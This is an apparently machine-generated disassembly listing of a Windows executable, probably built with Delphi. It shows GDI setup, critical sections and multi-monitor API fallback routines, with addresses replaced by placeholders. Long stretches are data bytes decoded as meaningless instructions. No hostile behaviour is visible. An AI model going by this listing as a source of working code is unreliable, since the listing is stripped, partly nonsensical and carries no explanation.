mov eax [ rw-data ]
call sub_403258
mov eax [ rw-data ]
call sub_403258
mov eax [ rw-data ]
call sub_403258
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404a0c
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404a0c
sub_421e08
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42190c
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_421988
mov cx 0x2c
mov dl 0x1
mov eax [ sub_41b468 ]
call sub_41b4dc
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41b468 ]
call sub_41b4dc
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41b468 ]
call sub_41b4dc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421a54
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4139c0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4139c0
mov [ rw-data ] eax
mov ecx sub_41bd34
mov edx sub_41bd44
mov eax [ sub_41a7a4 ]
call sub_413174
mov ecx r-xdata
mov edx sub_41bf4c
mov eax [ r-xdata ]
call sub_413174
sub_421f14
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_421f39
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421f40
retn
sub_421f50
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x1f
inc edx
add [ eax + eax ] dl
add [ eax ] al
inc esp
adc al 0x41
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax ] dh
inc ecx
add ah dl
aaa
inc ecx
add ah dl
and [ edx ] al
test [ esi ] dh
inc ecx
add [ eax ] al
aaa
inc ecx
add [ ebx ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x77ffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ ecx + 0x42 ] bl
add [ edx + ebp + 0x21a00040 ] cl
inc edx
add [ ecx + 0x540c0042 ] cl
dec edi
jb r-xdata
inc eax
add [ edx + esi ] cl
inc eax
add [ ecx + 0x42 ] bl
add al al
and [ edx ] eax
mov al [ 0xffffffff8c004221 ]
and [ edx ] eax
push es
inc edx
add [ eax ] cl
add [ eax ] al
add [ edi + ebx + 0x34880042 ] dh
inc eax
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
push esp
push ebx
je r-xdata
jb r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
dec esp
imul esi [ ebx + 0x74 ] 0x6800408d
and [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ecx ebx
mov edx edi
mov eax esi
call sub_4139bc
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403258
sub_42207c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_4220d4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_4139bc
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403258
sub_422118
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_42215c
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_4221a0
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_41369c
mov eax esi
pop esi
pop ebx
retn
sub_4221cc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4221f1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4221f8
retn
sub_4222c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4222e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4222ec
retn
sub_4222f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404440
xor eax eax
push ebp
push sub_4223b7
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4223be
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404450
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_4222f8
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f90
sub_4223e0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_4222f8
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_422468
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_4222f8
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_4224f8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_4222f8
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_422468
sub_42258e
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_4222f8
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_42260f
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_4222f8
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_4226fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_4222f8
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_4227d0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_4222f8
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_4228a4
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_4222f8
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_422a3f
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_422a65
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422a6c
retn
sub_422a80
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_422aa5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422aac
retn
sub_422ab8
mov esp 0xf00422a
or eax 0x6c654849
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
adc al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422aac
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
outsb
dec eax
insb
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
sub al 0x42
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0x2b247265
inc edx
add [ ecx ] al
xchg bx ax
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
[ eax ]
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11147265
inc eax
add [ ecx ] al
xchg ebx eax
cld
cmp cl [ ecx ]
dec eax
insb
jae r-xdata
push esi
je r-xdata
or [ eax + 0x65 ] ecx
insb
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ eax + eax ] cl
add [ eax ] al
or al 0x6e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2c ] ah
inc edx
outsb
je r-xdata
jo r-xdata
or [ eax + 0x65 ] ecx
insb
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
sub eax [ edx ]
outsb
je r-xdata
adc eax 0x65705349
je r-xdata
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
dec [ ebx + 0x422af4c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
inc eax
add al dh
outsb
je r-xdata
insb
jo r-xdata
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
inc eax
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
add [ esi + ebp * 2 ] cl
jae r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
imul ebp [ edi + 0x6e ] 0xc400408d
sub al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
sub al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dl
sub al 0x42
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0xffffffff88004010 ]
xor al 0x40
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + ebp ] ah
jae r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0x2b607265
inc edx
add [ ecx ] al
xchg bx ax
cld
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x422be0c0 ]
sub eax [ edx ]
unpckhps xmm1 [ ecx + 0x53 ]
jo r-xdata
add bh bh
jmp [ eax + 0xf00422b ]
inc edx
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
sub eax [ edx ]
add [ esi - 0x6d ] esp
insd
adc al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x422b64c0 ]
add [ edi ] cl
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42384b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
int3
mov eax eax
lea eax [ eax ]
pushad
sub al 0x42
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp + 0x2c600040 ]
inc edx
jae r-xdata
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
jo r-xdata
cmp cl [ ecx ]
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403fe4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423852
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a0c
lea eax [ ebp - 0x8 ]
call sub_4055cc
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405610
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_4220b8
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4055e4
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405610
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_422e7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_422ef2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_423008
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4055e4
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422ef9
lea eax [ ebp - 0x8 ]
call sub_4055cc
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f94
mov [ rw-data ] eax
sub_422f00
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f94
mov [ rw-data ] eax
mov ecx r-xdata
call sub_405610
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_422f58
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4055e4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_422f94
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
mov dl 0x1
mov eax [ r-xdata ]
call sub_42207c
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42207c
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42207c
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403f90
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_423008
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_423109
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f58
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_4220cc
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_4055cc
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cb74
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4055cc
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cb74
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f58
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_4220cc
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f58
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_4220cc
mov ecx r-xdata
call sub_405610
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423110
lea eax [ ebp - 0xc ]
call sub_4055cc
lea eax [ ebp - 0x8 ]
call sub_4055cc
retn
sub edx 0xfffffff8
sub_423128
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_4220b8
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_423168
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
